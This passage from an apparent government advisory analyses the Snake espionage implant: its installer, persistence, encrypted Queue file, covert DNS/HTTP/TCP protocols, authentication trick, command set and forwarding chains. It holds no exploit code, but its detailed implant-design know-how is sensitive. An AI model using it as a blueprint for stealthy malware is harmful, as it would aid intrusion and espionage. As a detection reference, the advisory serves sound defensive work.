Although the Snake implant as a whole is a highly sophisticated espionage tool, it does not escape human error. A tool like Snake requires more familiarity and expertise to use correctly, and in several instances Snake operators neglected to use it as designed. Various mistakes in its development and operation provided us with a foothold into the inner workings of Snake and were key factors in the development of capabilities that have allowed for tracking Snake and the manipulation of its data.
The FSB used the OpenSSL library to handle its Diffie-Hellman key exchange. The Diffie-Hellman key-set created by Snake during the key exchange is too short to be secure. The FSB provided the function DH_generate_parameters with a prime length of only 128 bits, which is inadequate for asymmetric key systems. Also, in some instances of what appeared to be rushed deployments of Snake, the operators neglected to strip the Snake binary. This led to the discovery of numerous function names, cleartext strings, and developer comments as seen in the following figure.

 


SNAKE HOST-BASED TECHNICAL DETAILS
The FSB has quickly adapted Snake when its capabilities have been publicly disclosed by private industry. Snake therefore exists in several variants, as it has evolved over almost 20 years. This CSA focuses on one of the more recent variants of Snake that up until now has not been widely disclosed. Older variants of Snake will be discussed briefly where applicable, but not discussed in depth, as many details of earlier Snake variants already exist in the public domain.
Installer
The Snake installer has gone by various names throughout Snake’s existence (e.g., “jpinst.exe”). This advisory will describe the version of the installer which regularly used the name “jpsetup.exe”. This executable is packed using a customized obfuscation methodology. The developers appear to have added the unpacking functionality from an open source project for viewing JPEG files. This technique serves to obfuscate the unpacking code within an otherwise legitimate code base.  The unpacking code extracts an executable, herein referred to as the “Png Exe”, and it extracts an AES encrypted blob from the Png Exe’s resources, which herein will be referred to as the “Png Resource”. 
The jpsetup.exe installer requires two arguments to be passed via the command line for execution. The first argument is a wide character string hashed with SHA-256 twice, and the resulting value of these computations becomes the AES key that decrypts the Png Resource. The AES initialization vector (IV) consists of the first 16 bytes of the second argument to jpsetup.exe after prepending the argument with a wide character “1” string. Once decrypted, the Png Resource becomes an executable that will be referred to herein as “Stage 2”. 
When unpacked, many components are extracted from Stage 2’s resources. Several of the resources are executables with additional resources of their own. Stage 2 creates structures from its resources, which ultimately become the host artifacts of Snake.
On-Disk Components
As Windows has been the most prevalent operating system targeted by Snake, this document will only discuss the Windows-based artifacts; however, Snake can be cross-compiled and is capable of running on other operating systems.
On-Disk Obfuscation
Snake’s host architecture and network communications allow an unusual level of stealth. Snake makes inventive use of its kernel module in both of these contexts. All known Windows versions of Snake have used a concealed storage mechanism to hide host componentry. In addition to using the kernel module to remove the relevant components from any listing returned by the operating system, Snake utilizes the kernel module to mediate any requests between Snake’s user mode components and the concealed storage mechanism, which itself is encrypted with a unique per-implant key. This unique keying creates detection difficulties even for tools that are independent of the compromised operating system, since simple signatures targeting Snake host components would be ineffective. 
Persistence Mechanism
The Snake version primarily discussed in this advisory registers a service to maintain persistence on a system. Typically, this service is named “WerFaultSvc,” which we assess was used to blend in with the legitimate Windows service WerSvc. On boot, this service will execute Snake’s WerFault.exe, which Snake developers chose to hide among the numerous valid Windows “WerFault.exe” files in the %windows%\WinSxS\ directory. Executing WerFault.exe will start the process of decrypting Snake’s components and loading them into memory. 

 


Encrypted Registry Key Data
Upon execution, Snake’s WerFault.exe will attempt to decrypt an encrypted blob within the Windows registry that is typically found at HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake’s kernel driver and kernel driver loader. The registry object’s structure can be seen on the right side of the following figure. Snake uses Microsoft Windows Cryptography API: Next Generation (CNG) key store to store the AES key needed to decrypt the registry object.

 


Kernel Driver and Custom Loader
Snake’s installer drops the kernel driver and a custom DLL which is used to load the driver into a single AES encrypted file on disk. Typically, this file is named “comadmin.dat” and is stored in the %windows%\system32\Com directory. The structure of this file can be seen on the left side of the figure above. The key, IV, and path to comadmin.dat are stored in the encrypted registry blob. 
The Queue File
The last host-based artifact to discuss is the Queue File. Typically, this file has been found within the %windows%\Registration directory with the format of <RANDOM_GUID>.<RANDOM_GUID>.crmlog, and is decrypted by Snake’s kernel driver. Due to the complexity and importance of the Queue File, its details are discussed at length in the following subsection. 
The Queue
The Queue is a Snake structure that contains various pieces of information, including key material, communication channels, modes of operation, the principal user mode component, etc., that Snake requires for successful operation. It should be noted that this is a name used by the developers and is not equivalent to a “queue” in the normal context of computer science. The Queue data is saved on disk in the Queue File, which is a flat file with a substructure that includes a 0x2c-byte file header followed by data blocks. Each data block corresponds to exactly one Queue Item, which could be, for example, a simple configuration parameter, a Snake command, or an entire embedded executable. Each Queue Item is associated with a specific Queue Container.
Queue Containers and Items
Each Container is identified by its Type and Instance values. Each Container Type holds the same type of information used by the Snake implant for a specific purpose. The following table shows the various Container Types and their functions. A Queue can have multiple Containers of the same Type, but each of these Containers will have different Instance values.

 


The data in each Container in the Queue is separated into Queue Items with the 0x40-byte metadata structure shown in the following table. The data content of the Queue Item immediately follows this structure. The Queue Items in each Container are distinguished by their corresponding Item Number as well as their Item Type identifier. The Item Number is assigned by the Snake implant itself, while Snake operators generally refer to the Item Type value when trying to reference a specific item.

 


Queue File Encryption
In previous versions of Snake, the Queue File existed within an encrypted covert store. The data belonging to the Queue Items themselves were also CAST-128 encrypted. In more recent versions, the covert store was removed, and the Queue File exists by itself on disk. The Queue Items inside the Queue File are still encrypted with CAST-128, and in addition, the full Queue File is also CAST-128 encrypted. The CAST keys used to encrypt the Queue Items within a Container Instance can be found in that Instance's corresponding 0x2 Container as Item Type 0x229 (see below). The key and IV used to encrypt the Queue File can be found by decoding strings within Snake’s kernel driver.
Container Descriptions
0xb Container
The 0xb Container lists the available modes of operation for a given Snake implant. When using a certain mode, Snake uses a specific set of Containers and communication channels. Each infection can use up to four different modes. Each mode in the 0xb Container will have a Container Instance value that all Containers associated with this mode will use, except for the 0x3 Container. 

 


0x0 Container
The 0x0 Container handles incoming commands/data for the host of the Snake infection. Commands will be queued in this Container until the implant is ready to execute them.
0x1 Container
The 0x1 Container handles outbound commands/data for the host of the Snake infection. The data will be queued within the 0x1 Container until the implant is ready to exfiltrate them.
0x2 Container
The 0x2 Container holds the configuration information for the mode to which it corresponds. Various pieces of information vital to Snake’s successful operation are stored within these Containers. This subsection will discuss a subset of the parameters that can be found within the 0x2 Container.

 


Pivotal key information can be found within the 0x2 Containers. This includes the inbound and outbound RSA keys (Items 0x228 and 0x227, respectively), the CAST key (Item 0x229) used to encrypt the individual items within the Queue Container, pre-shared keys used for the top layer of encryption in Snake’s network communication protocol, and a quasi-unique value for the implant, called the “ustart” value, needed for Snake network connectivity.
Snake is constantly passing data between its kernel and user mode components. The methodology (generally, named pipes) used to make these communications is listed in Items 0x65-0x6f of the 0x2 Container. Items 0x70-0x7a list the parameters necessary to establish these communications. 
Items 0xc9-0xd3 contain details of up to ten other Snake infections, referred to as “communication channels”, which the implant can communicate with during Passive Operations. The parameters needed to establish Snake sessions with the other hosts can be found in Items 0xd4-0xde.
Many additional data points, such as the process name where Snake injected itself or the modules Snake has loaded from its 0x3 Container, can be found within 0x2 Containers.
0x3 Container
The 0x3 Container houses embedded files and modules for Snake. A single 0x3 Container will be accessible to all Containers in the Queue. The 0x3 Container has its own dedicated 0x2 Container that only includes a single Queue Item of Item Type 0x229 (a CAST-128 key). This key will be used to encrypt and decrypt all of the embedded files and modules within the 0x3 Container.

 


The Item Types assigned to the embedded files and modules within the 0x3 Container are consistent across all of the Snake infections within Snake’s P2P network. For example, the 0x01 Item Type is the Zlib library, and therefore any time an Item Type of 0x01 is seen within the 0x3 Container of a Snake infection, that file is always the Zlib library. The implant’s 0x2 Container will keep track of libraries that it has loaded. If the DLL is a file on disk, the full path to the DLL is saved in the 0x2 Container. If the library was loaded from a 0x3 Container, the loaded module will be displayed in the implant’s 0x2 Container in the format “&<Item Type (within 3 container) of loaded module>”. 
0x4 Container
The 0x4 Container logs command activity. Each Queue Item within the Container is a log of a single executed or attempted command. Each mode will have its own corresponding 0x4 Container.
0x5 Container
The 0x5 Container holds Snake network logs, noting any IP address that has connected to this implant. Some versions of Snake no longer make use of this Container.
0x6 Container
The 0x6 Container saves commands that are set to execute at specific times. A Queue Item is created for each scheduled command.
0x7 Container
The 0x7 Container logs the IP addresses of any other Snake implants that have connected to this implant during Passive Operations. The commands 0x79 (Read Agents Track) and 0x7a (Clear Agents Track) are used to interact with this Container. Note that the command 0x7a had been deprecated in some versions of Snake and returns the error “function unsupported” if called.
SNAKE NETWORK COMMUNICATIONS
Snake’s network communications are encrypted, fragmented, and sent using custom methodologies that ride over common network protocols, including both raw TCP and UDP sockets and higher-level protocols like HTTP, SMTP, and DNS. Snake’s protocols for HTTP and TCP are the most commonly seen, but functionality exists for UDP, ICMP, and raw IP traffic. Snake’s network communications are comprised of “sessions”, which are distinct from the sessions associated with the legitimate protocol it is riding on top of (e.g., TCP sessions). The Snake session is then comprised of distinct commands. Both Snake’s custom transport encryption layer (“enc”) and Snake’s Application Layer have their own encryption mechanisms, where the enc layer operates on an individual P2P session and the Snake Application Layer provides end-to-end encryption between the controller (i.e., point of origin) and the command’s ultimate destination. The following figure details Snake’s communication protocol stack. 

 


Network Obfuscation
Snake’s use of its kernel module also facilitates stealthy network communications. To participate fully in Snake’s P2P network, implanted machines which are not the ultimate target must act as servers for other Snake nodes. Snake’s kernel module, along with a thoughtfully designed mechanism for distinguishing Snake traffic from legitimate client traffic, allows the implant to function as a server in the Snake P2P network without opening any new ports, greatly complicating detection efforts. Additionally, Snake’s custom network communication protocols are designed to blend with traffic that the compromised server normally would receive. This allows Snake operators to use legitimate servers as infrastructure, which reduces the effectiveness of simple IP address or domain blocking without needing to open new ports or send unusual looking traffic to this infrastructure. 
Snake’s Network Authentication Technique (“ustart”)
Snake uses its custom HTTP and raw socket TCP based protocols for large data communications.  With these protocols and others, Snake employs a specific authentication mechanism to distinguish Snake traffic from legitimate traffic destined for application software on the compromised server. This technique enables one of the uniquely sophisticated aspects of Snake, which is its ability to function effectively as server software without opening any further ports on the compromised system. The relevant per-implant authentication value is referred to as the “ustart” and is stored in the implant’s Queue File. There are multiple forms of the ustart value, including “ustart”, “ustart2”, and “ustartl”. 
Rather than open a listening socket on a specified TCP port, the Snake kernel module intercepts the first client-to-server packet following the 3-way handshake in every TCP session. The kernel module then determines whether or not the contents of that packet are in fact valid for the ustart value of that target Snake implant. If so, the Snake kernel module forwards that packet and any future packets in the same TCP session to Snake’s own processing functionality, and the (presumably legitimate) application listening on that port remains unaware of this TCP session. If not, the Snake kernel module allows the packet—and the rest of the TCP session as it occurs—to reach the legitimate listening application, for example web server software. See the following for an illustration. 

 


All of the ustart versions perform authentication by sending a random nonce along with data that comprises a mathematical operation on the combination of the nonce and the ustart value itself. The receiving machine then extracts the nonce and performs the same computations to authenticate the sending machine. The ustart2 and ustartl versions use the Fowler-Noll-Vo (FNV) hash algorithm to generate the overall authentication value from the nonce and the ustart. This mechanism is slightly different in the custom Snake HTTP protocol versus the custom Snake TCP protocol.
Using the ustart methodology, a node in the Snake P2P network can function as a server without opening any otherwise closed ports and without interfering in the compromised server’s legitimate functionality. Snake will only communicate over TCP ports on which another application is actively listening. This technique makes detecting Snake compromises through network traffic monitoring far more difficult. Inbound traffic to an unexpected TCP port can be detected or blocked using standard firewall or network intrusion detection functionality. Replacing a legitimate service application with a modified executable can lead to detection at either the host or network level. Snake’s technique bypasses both of these mitigations. When combined with the fact that Snake traffic looks similar to expected traffic, especially in the case of Snake’s HTTP based protocols, this renders detecting Snake communications difficult absent detailed knowledge of Snake’s custom protocols.
Snake UDP
Outbound Communications via DNS Query
Snake uses a specialized communications protocol to encode information in seemingly standard DNS queries run via the Windows or POSIX API function gethostbyname, depending on the version. Snake outbound DNS requests consist of character strings that are constructed to resemble standard domain names. The actual information being transmitted from the implant is contained in the part of the character string prior to the first ‘.’ character. For illustration purposes, this subsection will outline how an arbitrary string of bytes is manipulated and then encoded to form an outbound Snake DNS request carrying data provided by the implant.
Snake outbound DNS requests originally take the form of byte arrays stored on the stack as the implant progresses through the communications function. The byte array has the following structure.

 


Only the low-order seven bits of the flags byte are used, and they have the following significance.

 


After calculating and obfuscating the byte array values shown above, Snake encodes these byte values as de-facto base32 text, using the ten digits 0-9 and the 26 lowercase ASCII letters a-z, with v, w, x, y, and z all corresponding to the same value, as only 32 distinct characters are needed. Snake then inserts ‘-‘ characters at specified locations and sends the DNS request using the gethostbyname function. The resulting encoded string mimics a legitimate DNS request; because characters after the first ‘.’ are not part of the implant’s communications, any arbitrary suffix (e.g., “.com”) can be used. 
Inbound Communications via DNS Query Response
After sending the encoded DNS request, Snake parses the returned information. In a normal DNS request, the returned hostent structure contains a list of IPv4 addresses as 32-bit unsigned integers if the domain resolves to one or more IPv4 addresses. In the Snake DNS protocol, these 32-bit integers represent the covert channel data. The Snake implant sorts the 32-bit integers by the highest order nibble and then interprets the remaining 28 bits of each integer as the actual encoded data. The Snake DNS protocol thus provides a well-concealed, low-bandwidth communications channel.  For larger bandwidth communications, Snake uses its custom HTTP and TCP protocols.
Snake HTTP
The most common custom protocol that Snake uses is its “http” protocol, which rides on top of standard HTTP. It generally looks like normal HTTP communications, including a lot of base64-looking strings, thus blending well with normal network traffic. There have been multiple iterations of Snake’s http protocol, though the differences are only in the encoding; once that is peeled away, the underlying Snake http protocol is the same. For the purposes of this document, Snake’s former version of HTTP will be referred to as “http” and its more recent version as “http2”. 
Snake communications using http2 are contained within seemingly legitimate Application Layer HTTP communications. In the client-to-server direction, the implant data is contained within an HTTP header field of a GET request, unless the data is over a certain size (usually 256 bytes, but configurable). Observed field keys have included: Auth-Data, Cache-Auth, Cookie, and Cockie (note misspelling). This list is not exhaustive; any standard HTTP header field can be used. The communication itself is contained in the legitimate HTTP header field’s value, meaning the content following the ‘:’ character and any whitespace immediately thereafter. In HTTP GET requests, the implant generally uses the default path ‘/’, but this is not required and is configurable. Larger client-to-server Snake http2 requests are contained in the body of an HTTP POST request, and server-to-client communications are contained in the body of the HTTP response.
All client-to-server Snake http and http2 requests begin with the ustart authentication. The specifics vary with each ustart version, but in each case the random nonce and the computed function of the nonce and ustart value are encoded in a manner which closely resembles the rest of the Snake communication. Since Snake http and http2 implant sessions can span multiple TCP sessions, the ustart authentication mechanism is included in every client-to-server communication.
Base62 Encoding
Snake’s http2 protocol uses a custom base62 encoding scheme that has the following differences from base64. Base62 uses 62 semantically significant characters instead of 64. The ratio of encoded-to-decoded characters in base62 is less dense (11:8) than the ratio base64 can achieve (12:9). Also, base62 uses extraneous characters in certain instances that have no semantic significance. 
The base62 characters of semantic significance are the 62 strict alphanumeric characters: [0-9A-Za-z]. The extraneous characters that can be present in a base62 string—but which have no semantic significance—are: ‘/’, ‘;’, ‘=’, and ‘_‘ (underscore). When present, these characters are removed prior to performing the decoding process. A valid base62 string can have up to 11 of these extraneous characters. A regular expression for base62 is included in the Mitigations section of this CSA.
http and http2 Metadata Structure
After the base62 decoding is completed, if necessary, the remaining data begins with an 8-byte metadata structure that provides rudimentary sessionization on top of the stateless HTTP. Snake’s http and http2 client-to-server communications have three de-facto parts, which are concatenated into a single HTTP header value. These parts are: 1) an announce or authentication string, 2) a custom metadata structure, and 3) payload data. The metadata structure consists of the following:
struct http_meta {        uint32_t session_number;        uint16_t communication_number; uint8_t flags; uint8_t checksum; };
Snake uses the session_number and communication_number fields to provide its own custom sessionization on top of the stateless Application Layer HTTP protocol. The checksum byte serves to validate the integrity of the structure and must equal the sum of the first seven bytes modulo 256.
Snake TCP
Snake has the ability to communicate through POSIX-style TCP sockets. The implant’s custom TCP protocol, which herein will be called “tcp”, uses the reliability features of the underlying TCP protocol.  Thus, in the implant’s custom tcp protocol, the concept of a TCP session and an implant “session” are the same, whereas in the implant’s custom http protocols, one implant session could span multiple Transport Layer TCP sessions. Since the implant’s overall communications protocol is based on the idea of commands and responses, Snake depends on being able to specify the length of any given command and response so the recipient Snake node knows when a particular communication ends. Snake achieves this in the custom tcp protocol by prefacing each communication with its length encoded as a 32-bit big-endian unsigned integer. 
Immediately following the TCP 3-way handshake, the implant completes the ustart authentication for this session. Since Snake tcp sessions are mapped one-to-one with an underlying protocol TCP session, the ustart authentication only occurs once per session, rather than with each client-to-server communication as in Snake http and http2. The Snake tcp ustart mechanism is similar to the Snake http and http2 mechanisms, except that for certain ustart versions, Snake tcp uses a raw binary ustart which is not encoded in printable characters.
After the ustart authentication, the implant will begin sending length-data pairs. These pairs can be sent in the same packet or in two (or theoretically more) separate packets, but the pattern of length-data pairs will be present in each half of the stream (i.e., each direction) for the entirety of the implant communications for the remainder of the TCP session. Specifically, a length-data pair will consist of the length encoded as a big-endian 32-bit unsigned integer followed by data of exactly that length. For example, consider the instance where the implant is sending the following 4 arbitrary bytes: 
89 ab cd ef
The on-wire communication from the implant would send the integer value 4 encoded as a big-endian 32-bit integer, followed by the actual 4 bytes themselves, as shown below. This could be split across two (or theoretically more) packets.
00 00 00 04 89 ab cd ef
The custom tcp protocol (as well as all custom http protocols) have been used in conjunction with the Snake enc protocol. Details of the Snake enc protocol are provided in the following subsection. Due to the manner in which the Snake enc and Snake tcp protocols interact, the first six length-data pairs of each TCP half-stream (following the single client-to-server announce or authentication packet described above) will have known lengths. Specifically, each half-stream will begin with length-data pairs of the following lengths: 0x8, 0x4, 0x10, 0x1, 0x10, 0x10. Note that these are the lengths of the raw data, so each communication will be preceded by a 4-byte big-endian integer specifying the corresponding length. Thus, one of the half-streams could have the following TCP content:
00 00 00 08 12 34 56 78 9a bc de f0 00 00 00 04 89 ab cd ef 00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0 00 00 00 01 12 00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0 00 00 00 10 12 34 56 78 9a bc de f0 12 34 56 78 9a bc de f0
Snake “enc” Layer
As described above, Snake communications are all comprised of “Snake sessions”, irrespective of whichever legitimate protocol Snake is operating on top of. Snake’s top layer of encryption, called the enc layer, utilizes a multi-step process to establish a unique session key. The session key is formed through the combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) known to both parties. This PSK is stored in one of the communication channels, stored within the Queue. 
The overall establishment of the session key requires 12 communication steps, six in each direction, which involve sharing the pseudo-random values used in the Diffie-Hellman exchange process as well as custom aspects of the Snake session key derivation method. The session key is used to encrypt the command headers and (inner) encrypted payloads.
This is the layer in which the critical error of providing a value of 128 bits instead of 128 bytes for the call to DH_generate_parameters within the OpenSSL library occurred. Due to this insufficient key length, breaking the Diffie-Hellman portion of the exchange is possible. Note that in the following figure, the variables ‘p’, ‘g’, ‘a’, and ‘b’ are used in standard descriptions of Diffie-Hellman.

 


SNAKE APPLICATION LAYER
Snake’s Application Layer is used to process Snake commands. The payload data for a Snake session can contain one or more command exchanges, which include both the incoming data sent to the implant as well as the response returned to the server. Each command is associated with a specific ordinal, and due to Snake’s modular design, operators are able to add new commands to extend Snake’s capabilities by remotely loading a new module.
The Snake implant differentiates between High and Low commands and handles them differently, based on the ordinal number range. The majority of Snake commands are High commands that have an ordinal of 0x64 (100 decimal) or higher. There are far fewer Low commands, and these include the Forwarding command (with ordinal 0x1), and the four Queue commands (with ordinals 0xa, 0xb, 0xc, and 0xd). While Low commands are mostly used for moving data across the network, the High commands give the operator many options for interacting with an infected system. 
Command 0x15-byte Header
All commands begin with a 0x15-byte header, followed by optional command parameter data; only some commands require parameters for successful execution. For example, the command Get, which exfiltrates a file, requires the name of the file to exfiltrate, whereas the command Process List, which returns a process listing, does not require any parameters. 
The most important Command Header field contains the integer ordinal of the command being sent. The Item UID field represents a unique identifier for each individual command instance, and these values increase sequentially. The header has two fields used when a command is set to run at a specified date and time; these commands will be written to the 0x6 Container.
Some Low commands have another header before the payload data, which will be detailed below. All other commands have only the Command Header followed by the encrypted parameter data.

 


Command Encryption
Underneath Snake http2 or tcp encryption at the session layer, each command exchange is further encrypted. In older versions of Snake, the exchanges were CAST-128 encrypted using a different key for incoming and outgoing data. These keys were saved in the 0x2 Container in the 0x227 and 0x228 Items. The incoming payload data, if parameter data was present, could be decrypted with the 0x227 CAST key. Any response data was encrypted with the 0x228 CAST key. 
In recent versions, the 0x227 and 0x228 Items hold two RSA-4096 public keys. For each side of an exchange, a new 16-byte CAST key is created with Microsoft’s CryptoAPI CryptGenRandom function to obtain 16 random bytes. This key is used to CAST-128 encrypt the parameter or response data.
For an incoming command, the CAST key is signed (not encrypted) by the private key corresponding to the public key on the node to create a 512-byte RSA data blob. The incoming payload has the RSA blob, followed by the optional parameter data, which is CAST-128 encrypted. Snake uses the 0x227 RSA public key to decrypt the RSA blob, recover the CAST key, then decrypt the parameter data.
For an outgoing command, a new CAST key is obtained from CryptGenRandom, and any response data is CAST-128 encrypted. The key is then encrypted using the 0x228 public key to create a 512-byte data blob. The response payload data contains the 512-byte RSA blob, followed by the encrypted response data, when present.
Command Decoding
The implant will expect data in a specific format for each command ordinal. Parameter and response data contain several possible underlying data types, including wide-character plaintext strings, numeric values, data tables, files, or a combination of multiple types. 
The parameter data buffer itself will be formatted in a specific way, depending on the command ordinal. Some commands have required parameters, as well as optional parameters. Commands with optional parameters will include a metadata header with the data length and data type (e.g., bool, integer, text, or data buffer) before the optional parameter’s data. Other commands will expect the parameters to be formatted with length-data pairs, consisting of the parameter data length encoded as a four-byte big-endian integer followed by data of exactly that length. Still other commands have a custom header or will expect no length or metadata and will simply send the parameter data alone.
The response data will similarly be formatted by the implant in a specific way according to the command ordinal. The response data typically does not have a length or metadata preceding it, with the exception of the data tables. Examples of commands that return a table are the Process List command and the List Dir command.
Response data that includes a table will start with a table description header that indicates the number of columns and rows in the table. In addition, the header will include a Column Descriptor structure to indicate the type of data that column will contain, for example a string, uint32 or uint64, timestamp in epoch format, or the contents of a whole file (included as a table entry).
After the table description header, each field is added to the data payload buffer one at a time in a length-data pair. The fields across the first row are added in order, then the fields across the second row are added immediately after the first row with no metadata or separation, and so on. To parse this table, the server will account for the number of columns to determine where the next row starts.
High Commands
High commands are those with an ordinal of 0x64 (decimal 100) or higher. High commands give the operator many options for interacting with an infected system, as well as implant components. This subsection will describe some examples of the many High commands that can exist in the implant.
Some of the most basic High commands will gather information about the machine and return the results. For example, the FSB operators can use the PS command (0x65) to return a list of running processes, the List Dir command (0x840) to list the contents of a directory, or the Syst command (0x6b) to gather basic system information.
There are several commands that interact with the infected machine using standard built-in OS tools. The operator can use the Kill command (0x67) to kill a process, the Get command (0x68) to exfiltrate a file, the Put command (0x69) to write a file, the Del command (0x6a) to delete a file, or the Run command (0x66) to execute a command in a terminal shell and receive the results. For example, operators have used the Run command to run PowerShell commands, ping other hosts, use the Windows “net use” command to map network drives, and to run executable files that had been previously written to the node using the Put command.

 


In addition to commands that use the built-in OS functionality, there are several High commands that interact with Snake components. An operator can use the Read Config command (0x70) to read the 0x2 Container, which contains configuration data, or the Set Config Item command (0x71) to set a specific Queue Item within the 0x2 Container. For example, operators have used the Set Config Item command to add or update the IP addresses or domains and option parameters used to communicate with other Snake nodes. The Read Agents Track and Clear Agents Track commands (0x79 and 0x7a) interact with the 0x7 Container to read or delete logs which track which other Snake nodes have connected to this node. Note that the 0x7a command has been deprecated in some versions of Snake and returns the error “function unsupported” if called.
Snake has the ability to add additional commands by loading new modules. New modules can be loaded using the Load Modules command (0x72) or directly into memory using the Load Modules Mem command (0x7f). When compiling a module, the developer will assign an ordinal to each constituent command, which will then be used by the operator to call the newly added commands. These loaded modules can be removed using the Module Unload command (0x73).
Queue Commands
Queue Command Header
The four Queue commands contain a 0x3d-byte Queue Header following the Command Header. In more recent versions of Snake, this header is encrypted using the same CAST key used to encrypt the payload data. In this case, the Command Header is followed by the 512-byte RSA encrypted CAST key blob, the encrypted Queue Header, and finally the encrypted payload data.

 


Even though each of the four Queue commands only use a subset of the fields of the Queue Header (in different ways), the full header must be present for the command to be considered valid by the implant. Two fields in the header that all four Queue commands use are the Container Instance and Container Type fields, which indicate the specific Container on a node the Queue command intends to interact with. In the Queue Read and Write commands, the Item Type field is used to track the specific commands and their responses in the Containers.
Queue Enumerate Command
The Queue Enumerate command, with ordinal 0xa, is used to enumerate the contents of the 0x0 or 0x1 Containers to list all incoming or outgoing commands, respectively. The enumeration returns the 0x40-byte structure described above for each Queue Item, concatenated into a single return buffer.
Queue Read Command
The Queue Read command, with ordinal 0xb, is used to read an Item from the specified 0x0 or 0x1 Container. Several relevant fields in the Queue Header determine how the data is sent and stored. For example, the header determines whether the data should be sent immediately back to the server or stored for later transport. The header indicates if the implant should send the Queue Item’s header (i.e., the same 0x40-byte metadata structure returned by the 0xa command), the Item’s data, or both. The header also indicates whether the Queue Item should be deleted after being read and can also indicate that Queue Items with a lower Item Type should be deleted. This allows FSB operators to clear out all command Items previous to the one being read.
Queue Write Command
The Queue Write command, with ordinal 0xc, is used to write a Queue Item to the specified 0x0 or 0x1 Container. The Queue Header will indicate if a new Queue Item will be created, or an existing Queue Item will be modified.
If a Queue Item is set to be modified, an Item with the specified Item Type must exist in the specified Container. Several fields in the header must match specific attributes of the existing Queue Item. If these checks are met, the parameter data is written to the Queue Item. Fields in the Queue Header will indicate the length of data to be written, and the offset into the existing Queue Item where the write should begin.If a Queue Item is set to be created, Snake will delete existing Queue Items of the specified Item Type in the Container of interest, then create a new Item of the specified Item Type and write the parameter data to the Queue Item. A field in the Queue Header will indicate the length of data to be written.
Queue Delete Command
The Queue Delete command, with ordinal 0xd, is used to delete a Queue Item from the specified 0x0 or 0x1 Container. The Flags field will determine if the single Queue Item should be deleted, or if all Queue Items with a lower Item Type should be deleted as well.
Forward Commands
Forward commands, with command ordinal 0x1, are used to tell an implant to forward a Snake command to a second target node, where the command will be executed. The target node sends the response data back to the first implant, which will then package that response data as its own response back to the caller.
The command is designed to tell an implant to forward one command to another implant, but in practice, Forward commands are often built on top of each other to create a chain of hop points that will continue to forward a command to an end point, where it will be executed. The response data is then sent back through the same chain of hop points until it reaches the operator.
The Forward command has a 0x199-byte Forward Header, followed by the encrypted command parameter data that will be sent to the target node of the Forward command. The Forward Header contains the information the implant will need to connect to the target node, including the ordinal of the Snake command that is being forwarded to the target node for execution.
The implant that receives the Forward command will construct a new Snake command of the ordinal indicated in the Forward Header. It will connect to the target node in a new session, construct the Command Header, and send the encrypted command parameter data on to the target node. The parameter data already will have been encrypted using the key associated with the target node, so that the target implant will be able to decrypt the parameter data and execute the command. 
When the Forward command is constructed, the CAST key used to CAST-128 encrypt the payload data—to include the 0x199-byte header and the parameter data to be forwarded—is encrypted with the RSA key pair used by the first implant. The parameter data that contains the parameters for the command to be forwarded is also CAST-128 encrypted, but the key used to encrypt the parameter data is encrypted with the RSA key pair used by the target node. The first implant knows through the header what command ordinal it is forwarding, but it is unable to decrypt the parameter data.
If the Forward Header sent to the first implant indicates that the command to be forwarded was another Forward command, the first target node will decrypt the parameter data and find another Forward Header. This first target node implant will then go through the same process to connect to the next target node, constructing the new command with the ordinal indicated in the second Forward Header to send the remaining encrypted parameter data to the next target node. This will repeat until the command to be forwarded is something other than another Forward command.
The Command Header and pertinent parameters for each target node are encrypted specifically for that node by the operator before the Forward command is sent into the Snake P2P network. To illustrate, the diagram below shows how the buffer might look when several Forward commands are chained together to include two hop points and an end point. The first hop point (HP1) will recover the first CAST key and CAST-128 decrypt the rest of the buffer, which will uncover the first Forward Header. HP1 will then forward the remainder of the decrypted buffer to the next hop point (HP2), starting with the second CAST key blob. HP2 will recover the second CAST key and CAST-128 decrypt the rest of the buffer, which will uncover the second Forward Header. HP2 will then forward the remainder of the decrypted buffer to the end point, starting with the third CAST key blob. The end point will recover the CAST key, decrypt the command parameter data, and execute the command. 
When a target machine has executed a forwarded command, the return data is encrypted with that implant’s RSA keys and returned directly to the previous hop point. As the data is returned up the chain in the Snake P2P network, the intermediate hop points do not manipulate the encrypted data, as they do not have the RSA private key necessary to do so. In this manner, the return data is de-facto end-to-end encrypted throughout the P2P network until it arrives back at the FSB operator.

 


SNAKE IMPLANT OPERATION
Snake uses two main methods for communication and command execution, namely Passive and Active. In general, Snake operators will employ Active operations to communicate with hop points within Snake’s infrastructure; however, hop points can and do sometimes operate using Snake’s Passive method. Snake’s end points tend to solely operate using the Passive method.
Active Operations
During Active operations, Snake commands are issued by an FSB operator or a script to a target machine, generally through Forward commands (described in the previous section). The response to the command is immediately returned to the point of origin following the same path that the command took to reach its end target, as shown in the previous figure on Forward command structure.
Passive Operations
During Passive operations, Snake implants operate on their own, without the synchronous interaction of FSB operators. The nodes with which an implant communicates during Passive operations are stored within its 0x2 Container(s) as communication channels. Up to ten communication channels can be present at any time; an operator can change these channels via the Set Config Item command.
Passive Intake
During Passive operations, the implant will beacon by sending a Queue Read (0xb) command to one of its stored communication channels that it has chosen at random. These Queue Read commands look for a Queue Item within a Container with an Instance Number equal to the implant’s UID. The matching UID indicates the Queue Items in this Container are intended for the beaconing implant.
If such a Queue Item is found, the beaconing implant will read in the Queue Item and delete it off of the host from which it was read. There can be multiple Queue Items found within the specified Queue Container that was beaconed to; each Queue Read command will read one of these items. This process is repeated until all items within the Container are read, which the infrastructure node will indicate by sending a specific error in response to the Queue Read. This beaconing will continue to randomly select hosts at nondeterministic time intervals for as long as the implant is set to perform Passive operations.
Passive Data Exfiltration
Similar to how Snake intakes commands passively, it can also exfiltrate the resulting data passively. This is done using Queue Write (0xc) commands to write to one of the stored communication channels chosen at random. Once the data is off the end point node, operators generally retrieve it manually or using a script. The Item Type field, which is unique per executed Snake command, is needed to associate the exfiltrated data with the target node on which the command was run.
In the context of Passive Snake communications, the term Item Type is defined as a UID for a given Snake command and its resulting data. The Item Type serves as a unique identifier to associate the results of command execution with the original command written by the operator. When the FSB collects the data, Snake knows exactly what infection the data came from, and therefore it can determine what key to use to successfully decrypt the data.

 


To illustrate how Passive operations are conducted between the end points, the operator, and the hop points in between, see the diagram above, which is explained further by the following steps:

